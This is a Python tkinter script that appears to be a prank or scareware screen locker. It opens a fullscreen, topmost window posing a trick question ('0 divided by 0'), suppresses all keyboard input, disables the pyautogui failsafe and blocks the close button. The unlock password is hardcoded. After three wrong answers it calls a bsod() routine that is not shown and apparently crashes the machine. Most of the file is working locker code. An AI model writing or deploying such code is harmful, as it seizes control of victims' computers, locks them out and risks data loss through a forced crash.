from modules.modules import *


def exit():
   return messagebox.showerror('' , "It's inevitable")

def buton(arg):
    return entry.insert(END , arg)

def delbuton():
    return entry.delete(-1,END)

def tapp(key):
    pass

password = '-4.999'
count = 3


def check():
    global count
    if entry.get() == password:
        messagebox.showinfo(" ", "have a nice day.")
        root.destroy()
        exit()

    else:
        count -= 1
        if entry.get() == "0":
            messagebox.showwarning(" ", "Dumbass! You think you can play me?!")
        elif entry.get() == "1":
            messagebox.showwarning(" ", "Good but not the correct answer.")
        elif entry.get().lower() == "undefined":
            messagebox.showwarning(" ", "Screw what they told you!!!")

        if count == 0:
            messagebox.showwarning(" ", "you're screwed up")
            bsod()
        else:
            messagebox.showwarning(" ", "Wrong. Avalible tries: " + str(count))

def main():
    global entry , root , count , buttonn
    root = Tk()
    root.title(' ')
    pyautogui.FAILSAFE = False
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()

    root.lift()
    root.attributes('-fullscreen' , True)
    root.attributes('-topmost' , True)
    root.after_idle(root.attributes , '-topmost' , True)
    root.protocol('WM_DELETE_WINDOW' , exit)
    label = Label(root, text="What's 0 divided by 0 ?", font=("Consolas", 24))
    entry = Entry(root, width=int(width / 20), font=("Consolas", 14))
    button = Button(root, text="Submit", font=("Consolas", 14), command=check)
    frame = Frame(root, width=int(width / 20))


    buttonn = Button(
        frame,
        text="-",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "-"),
    ).pack(side=LEFT)
    buttonpoint = Button(
        frame,
        text=".",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "."),
    ).pack(side=LEFT)
    button0 = Button(
        frame,
        text="0",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "0"),
    ).pack(side=LEFT)
    button1 = Button(
        frame,
        text="1",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "1"),
    ).pack(side=LEFT)
    button2 = Button(
        frame,
        text="2",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "2"),
    ).pack(side=LEFT)
    button3 = Button(
        frame,
        text="3",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "3"),
    ).pack(side=LEFT)
    button4 = Button(
        frame,
        text="4",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "4"),
    ).pack(side=LEFT)
    button5 = Button(
        frame,
        text="5",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "5"),
    ).pack(side=LEFT)
    button6 = Button(
        frame,
        text="6",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "6"),
    ).pack(side=LEFT)
    button7 = Button(
        frame,
        text="7",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "7"),
    ).pack(side=LEFT)
    button8 = Button(
        frame,
        text="8",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "8"),
    ).pack(side=LEFT)
    button9 = Button(
        frame,
        text="9",
        padx="28",
        pady="19",
        font="Consolas  14",
        command=partial(buton, "9"),
    ).pack(side=LEFT)
    delbutton = Button(
        frame, text="<", padx="28", pady="19", font="Consolas  14", command=delbuton
    ).pack(side=LEFT)

    frame.place(relx=0.5, rely=0.8, anchor=CENTER)


    entry.place(relx=0.5, rely=0.5, anchor=CENTER)
    label.place(relx=0.5, rely=0.4, anchor=CENTER)
    button.place(relx=0.5, rely=0.6, anchor=CENTER)

    colors = its.product("f0f", repeat=6)
    for i in colors:
        try:
            root["bg"] = "#" + "".join(i)
            label["bg"] = "#" + "".join(i)
            root.update()
            time.sleep(0.01)
        except TclError:
            break


    keyboard.on_press(tapp, suppress=True)
    root.mainloop()


if __name__ == "__main__":
    main()
# end main